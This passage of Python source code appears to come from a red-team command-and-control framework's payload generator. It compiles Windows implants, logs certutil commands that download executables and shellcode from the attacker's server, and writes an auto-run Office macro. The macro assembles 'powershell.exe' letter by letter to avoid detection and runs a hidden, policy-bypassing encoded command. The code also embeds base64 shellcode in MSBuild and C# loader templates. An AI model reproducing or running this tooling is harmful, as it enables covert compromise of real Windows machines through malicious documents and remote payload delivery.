                compile32 = "C:\\TDM-GCC-32\\bin\\gcc.exe %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
            else:
                compile64 = "x86_64-w64-mingw32-gcc -w %s%sPosh64.c -o %s%sPosh64.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
                compile32 = "i686-w64-mingw32-gcc -w %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
            subprocess.check_output(compile64, shell=True)
            subprocess.check_output(compile32, shell=True)
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex86"
            filename = randomuri()
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri, filename))
            if os.name == 'nt':
                compile64 = "C:\\TDM-GCC-64\\bin\\gcc.exe %s%sPosh64_migrate.c -o %s%sPosh64_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
                compile32 = "C:\\TDM-GCC-32\\bin\\gcc.exe %s%sPosh32_migrate.c -o %s%sPosh32_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
            else:
                compile64 = "x86_64-w64-mingw32-gcc -w %s%sPosh64_migrate.c -o %s%sPosh64_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
                compile32 = "i686-w64-mingw32-gcc -w %s%sPosh32_migrate.c -o %s%sPosh32_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
            subprocess.check_output(compile64, shell=True)
            subprocess.check_output(compile32, shell=True)

            self.QuickstartLog(Colours.END)
            self.QuickstartLog("Download Posh/Sharp x86 and x64 shellcode from the webserver:" + Colours.GREEN)
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/64/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/86/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/64/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/86/portal"
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))

        except Exception as e:
            print(e)
            print("apt-get install mingw-w64-tools mingw-w64 mingw-w64-x86-64-dev mingw-w64-i686-dev mingw-w64-common")

    def CreateMacro(self, name=""):
        basefile = self.CreateRawBase()
        strmacro = formStrMacro("str", str(basefile))
        macro = """Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec

%s

exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str

Shell(exec)
End Sub

""" % strmacro
        self.QuickstartLog("Macro Payload written to: %s%smacro.txt" % (self.BaseDirectory, name))
        filename = "%smacro.txt" % (self.BaseDirectory)
        output_file = open(filename, 'w')
        output_file.write(macro)
        output_file.close()

    def CreateMsbuild(self, name=""):
        x86filename = "%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin")
        x64filename = "%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin")
        with open(x86filename, "rb") as b86:
            x86base64 = base64.b64encode(b86.read())
        with open(x64filename, "rb") as b64:
            x64base64 = base64.b64encode(b64.read())
        with open("%scsc.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        ccode = str(content).replace("#REPLACEME32#", x86base64.decode('UTF-8'))
        ccode = str(content).replace("#REPLACEME64#", x64base64.decode('UTF-8'))
        filename = "%s%scsc.cs" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(ccode)
        output_file.close()
        self.QuickstartLog("")
        self.QuickstartLog("CSC file written to: %s%scsc.cs" % (self.BaseDirectory, name))
        with open("%smsbuild.xml" % PayloadTemplatesDirectory, 'r') as f:
            msbuild = f.read()
        projname = randomuri()
        msbuild = str(msbuild).replace("#REPLACEME32#", x86base64.decode('UTF-8'))
        msbuild = str(msbuild).replace("#REPLACEME64#", x64base64.decode('UTF-8'))
        msbuild = str(msbuild).replace("#REPLACEMERANDSTRING#", str(projname))
        self.QuickstartLog("Msbuild file written to: %s%smsbuild.xml" % (self.BaseDirectory, name))
        filename = "%s%smsbuild.xml" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(msbuild)
        output_file.close()

    def CreateDynamicCodeTemplate(self):
        with open(f"{PayloadTemplatesDirectory}DynamicCode.cs", "r") as template:
            with open(f"{self.BaseDirectory}DynamicCode.cs", "w") as payload:
                payload.write(template.read())
